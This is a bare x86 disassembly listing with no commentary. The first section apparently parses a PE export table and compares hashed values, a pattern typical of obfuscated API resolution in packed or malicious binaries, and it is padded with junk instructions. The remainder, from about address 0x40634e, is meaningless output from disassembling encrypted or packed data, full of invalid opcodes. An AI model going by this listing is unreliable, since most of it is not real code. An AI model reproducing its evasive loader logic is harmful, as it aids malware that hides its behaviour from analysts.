  4061bf:	push   DWORD PTR [ebp-0x24]
  4061c2:	push   0x423992
  4061c7:	push   DWORD PTR [ebp-0x1c]
  4061ca:	push   0x3544
  4061cf:	call   DWORD PTR ds:0x424024
  4061d5:	jmp    0x406186
  4061da:	and    DWORD PTR ds:0x428020,0x0
  4061e4:	mov    ecx,DWORD PTR ds:0x428020
  4061ea:	inc    ecx
  4061eb:	mov    DWORD PTR ds:0x428020,ecx
  4061f1:	cmp    DWORD PTR ds:0x428020,0x1a
  4061f8:	jne    0x406211
  4061fe:	push   DWORD PTR [ebp-0x1c]
  406201:	push   0x561b
  406206:	push   0x3276
  40620b:	call   DWORD PTR ds:0x424028
  406211:	cmp    DWORD PTR ds:0x428020,0x17
  406218:	jb     0x4061e4
  40621e:	mov    eax,DWORD PTR [eax+0x18]
  406221:	mov    DWORD PTR [ebp-0x24],eax
  406224:	xor    eax,eax
  406226:	mov    eax,DWORD PTR [ebp-0x18]
  406229:	mov    ecx,DWORD PTR [ebp+0x8]
  40622c:	add    DWORD PTR ds:0x42901c,0x480
  406236:	add    ecx,DWORD PTR [eax+0x20]
  406239:	mov    DWORD PTR [ebp-0x2c],ecx
  40623c:	sub    DWORD PTR ds:0x42c00c,ebx
  406242:	mov    eax,DWORD PTR [ebp-0x18]
  406245:	mov    ecx,DWORD PTR [ebp+0x8]
  406248:	add    DWORD PTR ds:0x42a004,0x42a01c
  406252:	add    ecx,DWORD PTR [eax+0x24]
  406255:	mov    DWORD PTR [ebp-0x34],ecx
  406258:	inc    ecx
  406259:	mov    eax,DWORD PTR [ebp-0x18]
  40625c:	sub    DWORD PTR ds:0x42b010,0x20b8
  406266:	mov    ecx,DWORD PTR [ebp+0x8]
  406269:	or     DWORD PTR ds:0x42a010,0x1874
  406273:	add    ecx,DWORD PTR [eax+0x1c]
  406276:	mov    eax,edi
  406278:	mov    DWORD PTR [ebp-0x18],ecx
  40627b:	jmp    0x4062db
  406280:	mov    ecx,DWORD PTR [ebp-0x2c]
  406283:	mov    edx,DWORD PTR [ebp+0x8]
  406286:	add    edx,DWORD PTR [ecx+esi*4]
  406289:	mov    DWORD PTR [ebp-0x28],edx
  40628c:	mov    ecx,DWORD PTR [ebp-0x4]
  40628f:	mov    edx,DWORD PTR [ebp-0x28]
  406292:	xor    ecx,ebx
  406294:	add    ecx,eax
  406296:	cmp    edx,ecx
  406298:	je     0x4062db
  40629e:	jmp    0x4062c7
  4062a3:	mov    ecx,DWORD PTR [ebp-0x4]
  4062a6:	mov    edx,DWORD PTR [ebp-0x8]
  4062a9:	xor    ecx,ebx
  4062ab:	add    ecx,eax
  4062ad:	cmp    edx,ecx
  4062af:	je     0x40631f
  4062b5:	mov    ecx,DWORD PTR [ebp-0x4]
  4062b8:	mov    edx,DWORD PTR [ebp-0x30]
  4062bb:	xor    ecx,ebx
  4062bd:	add    ecx,eax
  4062bf:	cmp    edx,ecx
  4062c1:	je     0x40632e
  4062c7:	lea    eax,[ebp-0x8]
  4062ca:	push   eax
  4062cb:	push   DWORD PTR [ebp-0x28]
  4062ce:	push   DWORD PTR [ebp+0xc]
  4062d1:	call   0x41c3b5
  4062d6:	mov    eax,0x3272db
  4062db:	mov    ecx,DWORD PTR [ebp-0x4]
  4062de:	mov    edx,DWORD PTR [ebp-0x8]
  4062e1:	xor    ecx,ebx
  4062e3:	add    ecx,eax
  4062e5:	cmp    edx,ecx
  4062e7:	je     0x406302
  4062ed:	mov    ecx,DWORD PTR [ebp-0x34]
  4062f0:	movzx  ecx,WORD PTR [ecx+esi*2]
  4062f4:	mov    edx,DWORD PTR [ebp-0x18]
  4062f7:	mov    ecx,DWORD PTR [edx+ecx*4]
  4062fa:	mov    DWORD PTR [ebp-0x38],ecx
  4062fd:	jmp    0x4062a3
  406302:	mov    ecx,DWORD PTR [ebp-0x14]
  406305:	xor    ecx,ebx
  406307:	lea    esi,[esi+ecx*1+0x3272db]
  40630e:	jmp    0x405fec
  406313:	mov    eax,DWORD PTR [ebp-0x4]
  406316:	xor    eax,ebx
  406318:	add    eax,edi
  40631a:	jmp    0x40cf3f
  40631f:	mov    eax,DWORD PTR [ebp-0x4]
  406322:	xor    eax,ebx
  406324:	add    eax,0x3272db
  406329:	jmp    0x40cf3f
  40632e:	mov    ecx,DWORD PTR [ebp-0x38]
  406331:	add    ecx,DWORD PTR [ebp+0x8]
  406334:	mov    DWORD PTR [ebp-0x10],ecx
  406337:	mov    ecx,DWORD PTR [ebp-0x1c]
  40633a:	test   ecx,ecx
  40633c:	je     0x40ceca
  406342:	mov    DWORD PTR [ebp-0x20],0x0
  406349:	jmp    0x4086d8
  40634e:	ins    BYTE PTR es:[edi],dx
  40634f:	pop    ebp
  406350:	(bad)  
  406351:	call   0xd5a4cae1
  406356:	xchg   esi,eax
  406357:	imul   esi,edx,0x66
  40635a:	das    
  40635b:	mov    ds:0x3b380a06,eax
  406360:	bound  esp,QWORD PTR [edx+0x10]
  406363:	pop    edi
  406364:	bound  esp,QWORD PTR [edx+0x56]
  406367:	sub    bh,dl
  406369:	inc    ebp
  40636a:	dec    esi
  40636b:	sar    DWORD PTR [edi-0x48],cl
  40636e:	aad    0x24
  406370:	mov    dl,0x89
  406372:	sbb    eax,0xcf1b6f54
  406377:	xor    eax,0x49dcfb8c
  40637c:	sub    al,0xce
  40637e:	dec    ebx
  40637f:	sahf   
  406380:	add    eax,0xae3154fc
  406385:	dec    esp
  406386:	ins    DWORD PTR es:[edi],dx
  406387:	add    dl,BYTE PTR [esi-0x1]
  40638a:	out    dx,eax
  40638b:	mov    cl,0xf8
  40638d:	cld    
  40638e:	jns    0x406408
  406390:	or     dl,BYTE PTR [esi]
  406392:	push   ebp
  406393:	pop    ebp
  406394:	outs   dx,DWORD PTR ds:[esi]
  406395:	push   ebx
  406396:	retf   0xd26b
  406399:	push   eax
  40639a:	fs jl  0x4063f3
  40639d:	xor    al,0xbb
  40639f:	pop    esi
  4063a0:	push   edi
  4063a1:	adc    eax,0xcd509bfb
  4063a6:	xor    dl,bh
  4063a8:	shl    DWORD PTR [ebp-0x21b1eade],cl
  4063ae:	das    
  4063af:	jns    0x40636d
  4063b1:	pop    edi
  4063b2:	cmc    
  4063b3:	inc    esp
  4063b4:	adc    bh,ch
  4063b6:	sub    eax,0x7f3e3dea
  4063bb:	int    0x69
  4063bd:	xor    al,0x13
  4063bf:	out    0x48,al
  4063c1:	jg     0x406387
  4063c3:	xor    al,0x3e
  4063c5:	sbb    al,0x1b
  4063c7:	or     BYTE PTR [edi+0x1d8e5b2f],al
  4063cd:	mov    bh,0xa
  4063cf:	out    0x9d,al
  4063d1:	mov    ah,0xe7
  4063d3:	jle    0x4063ec
  4063d5:	xchg   BYTE PTR [edi+eiz*1],dl
  4063d8:	add    esi,DWORD PTR [ecx-0x2400002]
  4063de:	leave  
  4063df:	mov    ebx,DWORD PTR [edx+0x12368a3d]
  4063e5:	mov    dh,0xa4
  4063e7:	add    DWORD PTR [esp+ebp*4+0x16],ecx
  4063eb:	aam    0x59
  4063ed:	sub    ecx,DWORD PTR [ecx+ebx*1+0x42a7ebb4]
  4063f4:	xor    al,0xfe
  4063f6:	jmp    0x406466
  4063f8:	sbb    ebp,DWORD PTR [ecx]
  4063fa:	push   edx
  4063fb:	xchg   esp,eax
  4063fc:	loop   0x406456
  4063fe:	sub    al,0xf7
  406400:	pop    edx
  406401:	cmc    
  406402:	push   0xffffffa5
  406404:	iret   
  406405:	inc    eax
  406406:	adc    bh,BYTE PTR es:[edi]
  406409:	ret    
  40640a:	pop    ecx
  40640b:	push   esi
  40640c:	adc    DWORD PTR [ecx],esi
  40640e:	das    
  40640f:	ss aam 0xd4
  406412:	cmp    al,0x62
  406414:	jae    0x4063f8
  406416:	sti    
  406417:	pusha  
  406418:	and    BYTE PTR [edx-0x24afd507],bh
  40641e:	out    dx,al
  40641f:	lock rol DWORD PTR [ebp-0x25],1
  406423:	inc    ecx
  406424:	inc    ebx
  406425:	cmp    al,0x2d
  406427:	pop    edx
  406428:	pop    eax
  406429:	dec    eax
  40642a:	je     0x406497
  40642c:	add    DWORD PTR [edx-0x10d3bf7],edi
  406432:	adc    eax,0x23a78f1b
  406437:	es cwde 
  406439:	mov    dl,dl
  40643b:	cmp    bl,bh
  40643d:	aad    0x2f
  40643f:	fst    DWORD PTR [ebx]
  406441:	call   0x22915e8a
  406446:	sub    DWORD PTR [ebp+0x6],esp
  406449:	jecxz  0x40643b
  40644b:	fld    QWORD PTR [eax]
  40644d:	ja     0x40646b
  40644f:	add    bl,BYTE PTR [ebx]
  406451:	jnp    0x4063d5
  406453:	mov    ds:0x21e8bcc0,al
  406458:	push   eax
  406459:	add    edi,ecx
  40645b:	lods   al,BYTE PTR ds:[esi]
  40645c:	xchg   ebx,eax
  40645d:	pop    edi
  40645e:	ret    0x1e4d
  406461:	clc    
  406462:	ja     0x406436
  406464:	popf   
  406465:	jmp    0x493ed79a
  40646a:	adc    ecx,esp
  40646c:	(bad)  
  40646d:	into   
  40646e:	mov    dh,0xda
  406470:	sti    
  406471:	data16 xor ah,bl
  406474:	sbb    bl,BYTE PTR [eax+0x3c]
  406477:	push   cs
  406478:	or     eax,0x6d609cb2
  40647d:	hlt    
  40647e:	cld    
  40647f:	stos   BYTE PTR es:[edi],al
  406480:	pop    edi
  406481:	out    0xb6,al
  406483:	repz mov ch,0x76
  406486:	int3   
  406487:	push   esp
  406488:	fdiv   QWORD PTR [edx-0x259199a]
  40648e:	add    eax,0x59edf9a0
  406493:	push   edx
  406494:	push   ecx
  406495:	in     eax,dx
  406496:	mov    dh,0xfa
  406498:	jbe    0x40650b
  40649a:	add    BYTE PTR [eax+0x0],bl
  40649d:	lods   al,BYTE PTR ds:[esi]
  40649e:	aas    
  40649f:	sub    bl,BYTE PTR [ebx]
  4064a1:	inc    edi
  4064a2:	cmp    DWORD PTR [edx],ebp
  4064a4:	in     eax,dx
  4064a5:	(bad)  
  4064a6:	fadd   QWORD PTR [ecx+0x6c]
  4064a9:	(bad)  
  4064aa:	jae    0x4064b3
  4064ac:	popa   
  4064ad:	stos   BYTE PTR es:[edi],al
  4064ae:	daa    
  4064af:	pop    eax
  4064b0:	jg     0x40645f
  4064b2:	fcomip st,st(3)
  4064b4:	rcl    BYTE PTR [ebx+0x6d12c5f6],0xe9
  4064bb:	dec    dl
  4064bd:	push   cs
  4064be:	sub    BYTE PTR [esi-0x4c],0xec
  4064c2:	(bad)  
  4064c3:	mov    WORD PTR [esi-0x10],gs
  4064c6:	sbb    eax,0x1890c0b5
  4064cb:	pcmpgtw mm4,QWORD PTR [edx-0x2ca13850]
  4064d2:	data16 fcomp DWORD PTR [ecx-0x35d9b86]
  4064d9:	mov    eax,ds:0x66a374d3
  4064de:	sub    ecx,DWORD PTR [ebp-0x3]
  4064e1:	div    bh
  4064e3:	add    al,ah
  4064e5:	cmp    al,0xb8
  4064e7:	(bad)  
  4064e8:	(bad)  
  4064e9:	jmp    0x2bc66a9c
  4064ee:	mov    dl,bl
  4064f0:	in     al,0x7e
  4064f2:	dec    esi
  4064f3:	imul   edi,DWORD PTR [eax],0xffffffa8
  4064f6:	mov    eax,ds:0x1a23c2c6
  4064fb:	pusha  
  4064fc:	cmp    DWORD PTR [edx],ebp
  4064fe:	push   ecx
  4064ff:	sbb    dl,bl
  406501:	dec    esi
  406502:	fwait
  406503:	mov    ds:0xabcfafac,al
  406508:	(bad)  
  406509:	dec    esp
  40650a:	out    0x7c,eax
  40650c:	scas   eax,DWORD PTR es:[edi]
  40650d:	inc    ebx
  40650e:	dec    ebp
  40650f:	xchg   ecx,eax
  406510:	and    DWORD PTR [ecx+edx*2],ebp
  406513:	btc    DWORD PTR [eax+0x5e],edx
  406517:	iret   
  406518:	dec    ebx
  406519:	jg     0x406521
  40651b:	arpl   si,bx
  40651d:	cdq    
  40651e:	test   al,0xd0
  406520:	bound  ecx,QWORD PTR [ecx+eiz*1+0x51075b39]
  406527:	ret    0xa2ad
  40652a:	lods   al,BYTE PTR ds:[esi]
  40652b:	outs   dx,DWORD PTR ds:[esi]
  40652c:	mov    ch,0x27
  40652e:	iret   
  40652f:	adc    DWORD PTR [esp+eax*1+0x25291d5c],0x9f78e0d2
  40653a:	shl    DWORD PTR [ecx+0x77],cl
  40653d:	cmp    bl,BYTE PTR [eax+edx*2-0x7433ba25]
  406544:	xchg   edx,eax
  406545:	mov    bl,0x13
  406547:	mov    ds:0x5572ccef,eax
  40654c:	xchg   esp,eax
  40654d:	sub    eax,0x51651750
  406552:	pop    edi
  406553:	jge    0x40651b
  406555:	lea    ecx,[edx-0x2da988e4]
  40655b:	inc    esi
  40655c:	jg     0x4065a1
  40655e:	adc    al,0xb0
  406560:	out    dx,eax
  406561:	xor    dh,BYTE PTR [edx+eiz*1+0x674d039b]
  406568:	adc    ebx,edi
  40656a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40656b:	mov    al,ds:0x81350516
  406570:	lahf   
  406571:	popa   
  406572:	jne    0x406513
  406574:	and    eax,0xa44fc6fa
  406579:	pushf  
  40657a:	aad    0xb3
  40657c:	inc    ecx
  40657d:	mov    ecx,edi
  40657f:	cmp    dl,ch
  406581:	js     0x40652f
  406583:	aaa    
  406584:	jnp    0x4065f7
  406586:	push   esp
  406587:	outs   dx,BYTE PTR ds:[esi]
  406588:	ret    0x3530
  40658b:	xor    DWORD PTR [ebx+0x2793bed5],ecx
  406591:	fiadd  WORD PTR [ebx-0x4b086861]
  406597:	inc    esi
  406598:	sti    
  406599:	loope  0x406608
  40659b:	(bad)  
  40659c:	gs cld 
  40659e:	or     BYTE PTR [ecx+0x304d2fa1],cl
  4065a4:	and    dh,BYTE PTR ds:0x41da7c51
  4065aa:	das    
  4065ab:	aam    0x56
  4065ad:	push   cs
  4065ae:	adc    edi,DWORD PTR [esi+0x2108ffd3]
  4065b4:	jmp    0x406599
  4065b6:	call   ecx
  4065b8:	lahf   
  4065b9:	dec    eax
  4065ba:	sbb    ebx,DWORD PTR [ecx]
  4065bc:	bndstx [edi+0x1a8bc2b6],bnd3
  4065c3:	mov    al,0xcc
  4065c5:	clc    
  4065c6:	adc    dh,cl
  4065c8:	xchg   ecx,eax
  4065c9:	jp     0x4065d8
  4065cb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4065cc:	bound  esi,QWORD PTR [ebx-0x149d9efa]
  4065d2:	xor    al,0xcc
  4065d4:	sub    bl,dl
  4065d6:	cdq    
  4065d7:	fisub  DWORD PTR [esi+eax*8+0x27]
  4065db:	inc    ebp
  4065dc:	inc    edx
  4065dd:	sti    
  4065de:	shl    BYTE PTR [edx],cl
  4065e0:	xchg   DWORD PTR [ebx+eiz*8-0x50],edx
  4065e4:	push   0x726ea006
  4065e9:	cmp    eax,ebp
  4065eb:	pop    esi
  4065ec:	sbb    al,bl
  4065ee:	xchg   ebp,eax
  4065ef:	mov    DWORD PTR ds:0x37ad0477,edi
  4065f5:	cdq    
  4065f6:	mov    ebx,0xa73d05e4
  4065fb:	add    edx,ecx
  4065fd:	xchg   cl,ah
  4065ff:	mov    ch,0xb9
  406601:	xor    BYTE PTR [ebp+0x39672bd9],cl
  406607:	or     dh,dl
  406609:	xor    BYTE PTR [ecx+edi*8],0x28
  40660d:	xor    ch,BYTE PTR [eax+0x30]
  406610:	push   edi
  406611:	dec    esp
  406612:	mov    di,0x5125
  406616:	mov    esp,0xd05e48be
  40661b:	(bad)  
  40661c:	sbb    DWORD PTR [eax+0x50],edi
  40661f:	jne    0x406601
  406621:	push   eax
  406622:	push   ebp
  406623:	outs   dx,DWORD PTR ds:[esi]
  406624:	or     cl,BYTE PTR [edx+0x2e22bf03]
  40662a:	aaa    
  40662b:	je     0x4065b6
  40662d:	div    DWORD PTR ds:0xcdb4788b
  406633:	add    cl,BYTE PTR [ebx]
  406635:	mov    ah,0x5a
  406637:	inc    edi
  406638:	push   eax
  406639:	mov    BYTE PTR [edx],dl
  40663b:	lds    eax,FWORD PTR [edi+0x27823f37]
  406641:	test   eax,0xabf75c40
  406646:	neg    DWORD PTR [edi+0xd1d6a88]
  40664c:	add    BYTE PTR [eax],0x7
  40664f:	je     0x406641
  406651:	inc    edi
  406652:	mov    fs,ebp
  406654:	add    DWORD PTR [ebx+0x44],esp
  406657:	mov    ebp,0x56f0a50c
  40665c:	inc    esi
  40665d:	out    dx,al
  40665e:	inc    esi
  40665f:	mov    edx,DWORD PTR [ebx-0xf1705d4]
  406665:	fdiv   DWORD PTR [ebp+0x42]
  406668:	(bad)  
  406669:	jecxz  0x406680
  40666b:	inc    esi
  40666c:	movd   mm3,edx
  40666f:	adc    al,0xb7
  406671:	loop   0x4066e7
  406673:	fcom   st(3)
  406675:	push   0x56c99dd7
  40667a:	fdiv   st,st(1)
  40667c:	push   es
  40667d:	repnz mov eax,ds:0x3902b5d3
  406683:	adc    dl,ch
  406685:	jae    0x406666
  406687:	dec    esp
  406688:	add    eax,0x121dffcc
  40668d:	in     al,0x9a
  40668f:	jae    0x4066cc
  406691:	in     al,dx
  406692:	in     al,0x5
  406694:	outs   dx,BYTE PTR fs:[esi]
  406696:	lahf   
  406697:	push   0xffffff86
  406699:	sub    al,0x2b
  40669b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40669c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40669d:	dec    ecx
  40669e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40669f:	ss into 
  4066a1:	ror    esp,0xa5
  4066a4:	daa    
  4066a5:	loope  0x40663e
  4066a7:	mov    ecx,0x9e217bb9
  4066ac:	(bad)  [edx]
  4066ae:	rcr    DWORD PTR [esi],0x66
  4066b1:	leave  
  4066b2:	add    al,0x2b
  4066b4:	jbe    0x4066c4
  4066b6:	xchg   DWORD PTR [edx],edi
  4066b8:	cmp    ch,ah
  4066ba:	shl    BYTE PTR [esi],1
  4066bc:	test   ch,ah
  4066be:	hlt    
  4066bf:	lahf   
  4066c0:	xor    BYTE PTR [ebx+0x58],dh
  4066c3:	or     BYTE PTR [ecx+0x5a],0x57
  4066c7:	jae    0x40673b
  4066c9:	ffree  st(0)
  4066cb:	xchg   esi,eax
  4066cc:	pushf  
  4066cd:	lods   al,BYTE PTR ds:[esi]
  4066ce:	inc    esi
  4066cf:	and    BYTE PTR [esi+0x6c],dl
  4066d2:	enter  0xf95d,0x1a
  4066d6:	xor    ah,BYTE PTR ds:[edi]
  4066d9:	cmp    eax,0xe4de6539
  4066de:	add    BYTE PTR [edx-0x3e],bh
  4066e1:	dec    ebx
  4066e2:	pushf  
  4066e3:	std    
  4066e4:	pop    es
  4066e5:	mov    al,0x7c
  4066e7:	dec    ebp
  4066e8:	mov    edx,0xacaa9475
  4066ed:	rcl    BYTE PTR [esp+edx*8+0x43],0xf5
  4066f2:	push   ds
  4066f3:	push   ebp
  4066f4:	jmp    DWORD PTR [edx-0xd]
  4066f7:	mov    ecx,0x8aa45520
  4066fc:	iret   
  4066fd:	(bad)  
  4066fe:	mov    dh,0xd8
  406700:	inc    ecx
  406701:	setl   BYTE PTR [edi+0x5a]
  406705:	ins    BYTE PTR es:[edi],dx
  406706:	cli    
  406707:	mov    ah,BYTE PTR [ecx-0x56]
  40670a:	pop    es
  40670b:	mov    edi,0xed28d0ff
  406710:	in     eax,dx
  406711:	pop    ebx
  406712:	push   0x4f0cf8eb
  406717:	sub    eax,0x7d5f18fb
  40671c:	aam    0xa8
  40671e:	push   ebp
  40671f:	lods   eax,DWORD PTR ds:[esi]
  406720:	cmp    eax,0xe38c0676
  406725:	retf   
  406726:	daa    
  406727:	and    bh,bl
  406729:	addr16 pop ecx
  40672b:	sub    eax,ebx
  40672d:	dec    ecx
  40672e:	test   al,0xac
  406730:	fcom   DWORD PTR [edx]
  406732:	inc    eax
  406733:	xor    ecx,DWORD PTR [ebx-0x32]
  406736:	adc    DWORD PTR ds:0xcf59eaa8,eax
  40673c:	xor    al,0x84
  40673e:	adc    ebp,DWORD PTR [ebp-0x51]
  406741:	bound  edi,QWORD PTR [edi+edx*2]
  406744:	push   0xfed83f17
  406749:	test   BYTE PTR [edx+0x16],0x29
  40674d:	mov    esi,0xd6709419
  406752:	or     al,0x1
  406754:	inc    ebp
  406755:	mov    ecx,0x5945c6e5
  40675a:	ficomp WORD PTR [eax-0x4218c55]
  406760:	xchg   ecx,edi
  406762:	pushf  
  406763:	mov    ch,0x3b
  406765:	jge    0x406749
  406767:	fdivp  st(2),st
  406769:	xchg   edx,eax
  40676a:	cmp    al,0x36
  40676c:	mov    ch,0x63
  40676e:	sub    al,0x2d
  406770:	and    eax,0x3f9c63cf
  406775:	fmul   QWORD PTR [esi-0x70]
  406778:	pushf  
  406779:	push   edi
  40677a:	xchg   ebx,eax
  40677b:	outs   dx,BYTE PTR ds:[esi]
  40677c:	mov    fs:0xb7e85e1d,al
  406782:	adc    al,0x96
  406784:	jge    0x4067e4
  406786:	push   ss
  406787:	sub    dh,BYTE PTR [edx+0x6f]
  40678a:	es aas 
  40678c:	pmulhuw mm4,QWORD PTR [edx-0x5427ebd4]
  406793:	hlt    
  406794:	test   eax,0x56c8cd05
  406799:	push   esi
  40679a:	call   0xc9901d70
  40679f:	lods   al,BYTE PTR ds:[esi]
  4067a0:	ins    BYTE PTR es:[edi],dx
  4067a1:	shr    BYTE PTR [ebx-0x35],cl
  4067a4:	adc    bh,BYTE PTR [ebp-0x540854fa]
  4067aa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4067ab:	inc    ebp
  4067ac:	add    BYTE PTR [ebp+0x351dfafb],dh
  4067b2:	add    edi,esi
  4067b4:	dec    edi
  4067b5:	dec    esi
  4067b6:	jl     0x40681a
  4067b8:	int    0x2b
  4067ba:	jg     0x4067a6
  4067bc:	push   ebx
  4067bd:	xchg   DWORD PTR [ebp-0x11],edi
  4067c0:	push   edx
  4067c1:	ins    DWORD PTR es:[edi],dx
  4067c2:	jmp    0x1b7a:0x2159e754
  4067c9:	xor    eax,0x2913cfc9
  4067ce:	int3   
  4067cf:	pop    ds
  4067d0:	jns    0x406843
  4067d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4067d3:	es dec edx
  4067d5:	jne    0x4067a4
  4067d7:	jecxz  0x4067dc
  4067d9:	mov    bh,BYTE PTR ds:0xc595e396
  4067df:	push   0x9e9e49c2
  4067e4:	in     eax,dx
  4067e5:	sub    al,0xa9
  4067e7:	loop   0x406838
  4067e9:	xor    edi,DWORD PTR [ebp-0x4c]
  4067ec:	aam    0x6b
  4067ee:	loopne 0x40680b
  4067f0:	adc    DWORD PTR [eax+0x21],0xffffffc6
  4067f4:	pop    edi
  4067f5:	and    al,0xcb
  4067f7:	int3   
  4067f8:	xchg   esp,eax
  4067f9:	imul   esi,edx,0xce4adc84
  4067ff:	xor    BYTE PTR [edx-0x5ec54015],ah
  406805:	repnz pop es
  406807:	add    DWORD PTR [ebp+0xa],edi
  40680a:	jo     0x406822
  40680c:	mov    ebx,DWORD PTR [edi-0x7]
  40680f:	mov    eax,eax
  406811:	call   0x525e6aed
  406816:	dec    ebx
  406817:	lock das 
  406819:	mov    esp,0x5ec08957
  40681e:	or     ah,BYTE PTR [esi+0xe]
  406821:	ror    BYTE PTR ds:0xc548d322,1
  406827:	pop    ecx
  406828:	aad    0xbf
  40682a:	and    bl,BYTE PTR [ebx-0x6f387222]
  406830:	mov    WORD PTR [edx-0x76],es
  406833:	out    dx,al
  406834:	outs   dx,DWORD PTR ds:[esi]
  406835:	ins    BYTE PTR es:[edi],dx
  406836:	pusha  
  406837:	xor    al,0x81
  406839:	jp     0x406870
  40683b:	sbb    al,0xc3
  40683d:	repnz cdq 
  40683f:	aad    0xeb
  406841:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406842:	xchg   edx,eax
  406843:	call   DWORD PTR ds:0x38a3701b
  406849:	sub    al,0xab
  40684b:	cld    
  40684c:	mov    eax,0xf4dccd05
  406851:	inc    ecx
  406852:	mov    bh,0xd0
  406854:	sti    
  406855:	cmp    dl,BYTE PTR [esi+edx*2+0x0]
  406859:	in     eax,dx
  40685a:	push   es
  40685b:	add    BYTE PTR [ecx+0x15],dh
  40685e:	loope  0x4068aa
  406860:	mov    esp,DWORD PTR [edi+ebp*8]
  406863:	mov    dl,ah
  406865:	add    edx,edx
  406867:	into   
  406868:	addr16 test al,0x5b
  40686b:	aam    0x65
  40686d:	mov    dh,cl
  40686f:	ret    
  406870:	xchg   ebx,eax
  406871:	or     eax,0x8fecdfb5
  406876:	mov    ebp,DWORD PTR [ebp+0x70]
  406879:	adc    ebx,esi
  40687b:	mov    ch,0x6a
  40687d:	dec    edx
  40687e:	pushf  
  40687f:	iretw  
  406881:	or     ch,BYTE PTR [ebp-0x10801173]
  406887:	fwait
  406888:	ins    BYTE PTR es:[edi],dx
  406889:	imul   edx,DWORD PTR [esi+0x0],0x544f1235
  406890:	and    ebp,DWORD PTR [ecx+edx*4-0x7a1ad535]
  406897:	pop    edi
  406898:	xchg   BYTE PTR [eax-0x6f92d67d],dl
  40689e:	push   cs
  40689f:	call   0x4731:0xa572f421
  4068a6:	(bad)  
  4068a7:	xor    esp,ecx
  4068a9:	mov    al,ds:0xf3d785f1
  4068ae:	mov    ch,0x7
  4068b0:	mov    cl,BYTE PTR [eax-0x4d7c4999]
  4068b6:	jns    0x40688b
  4068b8:	adc    BYTE PTR [eax+0xc],dh
  4068bb:	mov    ds:0x70eaba71,eax
  4068c0:	(bad)  
  4068c1:	sub    ah,BYTE PTR ss:[edi+ebp*1-0x49]
  4068c6:	xor    eax,0x8564d90
  4068cb:	push   ds
  4068cc:	mov    ah,cl
  4068ce:	cmp    eax,0x19f4f5c
  4068d3:	add    BYTE PTR [ebx+0x16b757bd],dh
  4068d9:	enter  0xe6d0,0xa4
  4068dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4068de:	sti    
  4068df:	repnz and DWORD PTR [edx+0x7010e48a],edx
  4068e6:	mov    ecx,0xd0869e95
  4068eb:	div    esp
  4068ed:	ficom  WORD PTR [ecx]
  4068ef:	jecxz  0x4068c4
  4068f1:	ins    DWORD PTR es:[edi],dx
  4068f2:	rol    BYTE PTR [ebx-0x33],1
  4068f5:	mov    edi,es
  4068f7:	inc    esi
  4068f8:	sbb    cl,BYTE PTR ds:0x6de5d09d
  4068fe:	push   ss
  4068ff:	mov    edx,ecx
  406901:	jmp    0x6356e073
  406906:	inc    ebp
  406907:	jbe    0x406929
  406909:	xor    dl,0x94
  40690c:	das    
  40690d:	loopne 0x406926
  40690f:	test   BYTE PTR [ecx],al
  406911:	scas   al,BYTE PTR es:[edi]
  406912:	dec    esi
  406913:	retf   
  406914:	or     bl,BYTE PTR [eax+0x15]
  406917:	adc    BYTE PTR [eax+0x3966a659],bh
  40691d:	repz and BYTE PTR [eax],al
  406920:	dec    edx
  406921:	in     al,dx
  406922:	xchg   dh,bh
  406924:	(bad)  
  406925:	fisub  DWORD PTR [esi+0x3ae3bdc0]
  40692b:	test   ah,ch
  40692d:	push   ebp
  40692e:	(bad)  
  40692f:	(bad)  
  406931:	adc    esi,0x2b
  406934:	aam    0xb4
  406936:	sti    
  406937:	arpl   WORD PTR [eax],ax
  406939:	push   es
  40693a:	mov    dh,0xa4
  40693c:	ins    DWORD PTR es:[edi],dx
  40693d:	ins    BYTE PTR es:[edi],dx
  40693e:	add    DWORD PTR [eax-0x270a73fe],0x41
  406945:	nop
  406946:	pop    es
  406947:	sbb    dh,BYTE PTR [esi+0x7251888f]
  40694d:	call   0x3801:0x32a0f9fd
  406954:	mov    esi,DWORD PTR [edi+0x40]
  406957:	inc    esp
  406958:	sub    DWORD PTR [eax+0x1b],0x8f69e41a
  40695f:	dec    edx
  406960:	adc    edx,0xd
  406963:	sub    BYTE PTR ds:0x7bfb2635,0xe1
  40696a:	pop    eax
  40696b:	mov    bh,0x14
  40696d:	ret    0x48be
  406970:	sar    dl,cl
  406972:	push   eax
  406973:	arpl   cx,cx
  406975:	jo     0x406927
  406977:	gs cwde 
  406979:	pop    ecx
  40697a:	outs   dx,BYTE PTR ds:[esi]
  40697b:	cmp    edi,edx
  40697d:	mov    eax,ds:0x29f51216
  406982:	push   ebp
  406983:	std    
  406984:	fsubr  DWORD PTR ss:[edi+ecx*1+0x46]
  406989:	psrlw  mm4,QWORD PTR [ebp+0x5a4da0ff]
  406990:	and    al,0x29
  406992:	sbb    al,0x4d
  406994:	je     0x4069e1
  406996:	mov    al,ds:0x50bd8aa7
  40699b:	aas    
  40699c:	out    dx,eax
  40699d:	loopne 0x4069c3
  40699f:	adc    DWORD PTR [ecx],edi
  4069a1:	out    0xf4,eax
  4069a3:	sub    DWORD PTR [ebx],0xffffffb7
  4069a6:	sbb    ebx,eax
  4069a8:	loop   0x406938
  4069aa:	mov    ebp,0xd904067
  4069af:	sbb    al,BYTE PTR [edi+0x62]
  4069b2:	push   cs
  4069b3:	xor    BYTE PTR [bx],ch
  4069b6:	jnp    0x4069b4
  4069b8:	mov    bh,0xb3
  4069ba:	out    0x9c,al
  4069bc:	or     eax,0xc1c26870
  4069c1:	ds push eax
  4069c3:	repz jge 0x406992
  4069c6:	xchg   edx,eax
  4069c7:	(bad)  
  4069c8:	mov    bl,0x4b
  4069ca:	std    
  4069cb:	fldenv [esi]
  4069cd:	sub    DWORD PTR [edx],ecx
  4069cf:	gs test esp,esp
  4069d2:	sbb    al,0x46
  4069d4:	add    DWORD PTR [edi+0x549c6509],eax
  4069da:	pop    ss
  4069db:	les    edi,FWORD PTR [esp+edi*1+0x6c3b646b]
  4069e2:	lahf   
  4069e3:	outs   dx,BYTE PTR ds:[esi]
